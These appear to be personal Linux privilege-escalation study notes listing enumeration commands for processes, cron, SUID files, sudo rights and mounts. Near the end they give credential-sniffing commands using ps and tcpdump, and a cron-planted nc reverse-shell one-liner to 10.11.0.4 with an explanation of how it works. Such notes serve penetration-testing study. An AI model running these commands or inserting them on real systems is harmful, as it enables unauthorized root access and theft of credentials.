Linux privilege escalation


Processes
ps -aux

route tables
route or routel

find connections 

ss -anp

Cron stuff

Show permissions for every folder that starts with the name cron recursively.
ls -lah /etc/cron*

crontab -l
sudo crontab -l (may be runnable if user has the permission)

dpkg -l (list every installed package

find all writable directory by current user
find / -writable -type d 2>/dev/null

find all permissions with SUID set. (allows you to
find / -perm -u=s -type f 2>/dev/null

Mounts - In summary, mount shows the current mount status, /etc/fstab represents the expected configuration, and lsblk provides information about the block devices and their partitions present on the system.

cat /etc/fstab

mount

lsblk

lsmod - list all kernel modules

list module info using /sbin/modinfo mod

group 0 is root, 42 is shadow.... Be careful if you change your accounts info, you may break your only foot-point. its better to just make a new account


sudo -l lets you check what this account can run as sudo, super useful!

check the following for potentially stored plain text creds... immediately try to do su - root as these are likely creds needed for higher privs scripts...

.bashrc

.bashanything really

env

Capture Creds

watch -n 1 "ps aux | grep pass" >> outputfile

if you have tcpdump in sudo -l...

sudo tcpdump -i lo -A | grep "pass"

Cron Jobs

1) scan system level cron jobs
grep "CRON" /var/log/syslog

2) edit a cronjob to get a reverse shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f
- this delete the fifo pipe if exists, creates another one, cats its contents to a shell with interactive i flag and redirect errors to error log, write to fifo pipe



